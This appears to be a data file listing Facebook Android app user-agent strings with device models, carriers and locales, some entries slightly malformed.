"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2265};FBLC/de_DE;FBRV/0;FBCR/A1;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/303418653;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/303418653;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076512;FBDM/{density=2.0,width=720,height=1344};FBLC/cs_CZ;FBRV/303764041;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2178};FBLC/cs_CZ;FBRV/303703753;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/302927872;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076253;FBDM/{density=3.0,width=1080,height=2016};FBLC/cs_CZ;FBRV/303991551;FBCR/O2 Family;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621626;FBDM/{density=3.0,width=1080,height=2130};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076512;FBDM/{density=2.0,width=720,height=1344};FBLC/cs_CZ;FBRV/304096540;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076252;FBDM/{density=2.0,width=720,height=1369};FBLC/cs_CZ;FBRV/304230062;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076512;FBDM/{density=2.0,width=720,height=1344};FBLC/cs_CZ;FBRV/304151102;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076411;FBDM/{density=3.0,width=1776,height=1080};FBLC/cs_CZ;FBRV/304146286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/WAS-LX1;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076505;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/0;FBCR/TELEMACH;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076497;FBDM/{density=2.0,width=720,height=1352};FBLC/en_US;FBRV/304627012;FBCR/airtel;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/304667161;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=2.75,width=1080,height=2110};FBLC/cs_CZ;FBRV/304667161;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/0;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/304749896;FBCR/Vodafone CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/COL-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBPN/com.facebook.katana;FBLC/es_US;FBBV/303076  12;FBCR/Movistar FBMF/samsung;FBBD/samsung;FBDV/SM A022M;FBSV/10;FBCA/armeabi v7a:armeabi;FBDM/(density=1.875,width=720,height=1465):FB_FW/1:FBRV/0;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400854;FBDM/{density=3.0,width=1080,height=2130};FBLC/cs_CZ;FBRV/305186902;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=2.75,width=1080,height=2068};FBLC/cs_CZ;FBRV/305222525;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/303731543;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/0;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/305275776;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2139};FBLC/cs_CZ;FBRV/304857316;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076505;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/0;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621604;FBDM/{density=1.7,width=720,height=1198};FBLC/cs_CZ;FBRV/303418653;FBCR/O2 Family;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/F5321;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400854;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/305464431;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/305598518;FBCR/Vodafone CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/COL-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400873;FBDM/{density=2.0,width=720,height=1369};FBLC/cs_CZ;FBRV/305849294;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518988;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/289140577;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/305820581;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660426;FBDM/{density=2.625,width=1080,height=2132};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/304857316;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076497;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/304282940;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-J727AZ;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=2.75,width=1080,height=2120};FBLC/cs_CZ;FBRV/305660508;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 10;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;] FBBK/1CookieqstJ",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428684;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/292693120;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660392;FBDM/{density=2.0,width=1920,height=1133};FBLC/cs_CZ;FBRV/306637004;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/AGS2-W09;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp;amp-T;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.1.0.28.119;FBBV/306506808;FBDM/{density=2.0,width=720,height=1358};FBLC/cs_CZ;FBRV/307493530;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/AUM-L29;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660426;FBDM/{density=2.625,width=1080,height=2184};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186602;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/IND-JIO;FBMF/YU;FBBD/YU;FBPN/com.facebook.katana;FBDV/YU5014;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2332};FBLC/en_GB;FBRV/306052152;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1931;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279834;FBDM/{density=1.75,width=720,height=1466};FBLC/cs_CZ;FBRV/308889418;FBCR/Vodafone CZ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(20);FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=3.0,width=1080,height=2145};FBLC/cs_CZ;FBRV/308975548;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127275;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/272618289;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/309796682;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809025;FBDM/{density=1.75,width=720,height=1448};FBLC/cs_CZ;FBRV/309912392;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460578;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308808908;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/310376028;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809006;FBDM/{density=3.0,width=1080,height=1794};FBLC/es_LA;FBRV/310509758;FBCR/Kolbi ICE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/WAS-LX2;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809011;FBDM/{density=3.0,width=1080,height=2110};FBLC/en_US;FBRV/310753832;FBCR/vodafone NZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FB_FW/2;FBCR/MY CELCOM;FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595753;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/311455761;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295906941;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBRV/297807842;FBCR/Claro AR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/313030580;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606714;FBDM/{density=2.0,width=720,height=1344};FBLC/sk_SK;FBRV/313101011;FBCR/O2 - SK;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/313283657;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606622;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/313515503;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606773;FBDM/{density=2.0,width=720,height=1369};FBLC/cs_CZ;FBRV/314125016;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/314366011;FBCR/O2-CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=2.625,width=1080,height=2131};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/0;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/315037494;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672619;FBDM/{density=3.0,width=1080,height=2128};FBLC/cs_CZ;FBRV/314972287;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/INE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621663;FBDM/{density=3.0,width=1080,height=2090};FBLC/cs_CZ;FBRV/303418653;FBCR/O2 Family;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=2.75,width=1080,height=2180};FBLC/cs_CZ;FBRV/315037494;FBCR/HT HR;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=2.75,width=1080,height=2110};FBLC/cs_CZ;FBRV/315037494;FBCR/O2 Family;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809011;FBDM/{density=3.0,width=1080,height=2130};FBLC/cs_CZ;FBRV/310753832;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=2.75,width=1080,height=2167};FBLC/cs_CZ;FBRV/315762358;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2103K19G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=3.0,width=1080,height=2049};FBLC/bg_BG;FBRV/315840915;FBCR/Telenor BG;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HMA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Agente de usuario [FBAN/FB4A;FBAV/170.0.0.52.95;FBBV/105856848;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBRV/106318734;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700M;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"FBAN/FB4A;FBAV/170.0.0.52.95;FBBV/105856848;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBRV/106318734;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700M;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=2.75,width=1080,height=2180};FBLC/cs_CZ;FBRV/316164977;FBCR/HT HR;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823257;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/315972962;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480881;FBDM/{density=1.5,width=480,height=782};FBLC/de_DE;FBRV/0;FBCR/vodafone.de;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 510;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823257;FBDM/{density=3.0,width=1080,height=2028};FBLC/zh_TW;FBRV/316481931;FBCR/&#21488-&#28771-&#22823-&#21733-&#22823-;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TDB;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823216;FBDM/{density=2.75,width=1080,height=2030};FBLC/cs_CZ;FBRV/316634502;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/335.0.0.28.118;FBBV/316528028;FBDM/{density=1.75,width=720,height=1448};FBLC/en_GB;FBRV/317833086;FBCR/A1 SRB;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/335.0.0.28.118;FBBV/316527981;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/317999187;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/335.0.0.28.118;FBBV/316527979;FBDM/{density=1.75,width=720,height=1280};FBLC/en_US;FBRV/317471897;FBCR/Virgin Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J737P;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/229281767;FBCR/LTC Safe at Home;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 6A;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/231734264;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391070;FBDM/{density=2.625,width=1080,height=2186};FBLC/mk_MK;FBRV/322487193;FBCR/T-Mobile MK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
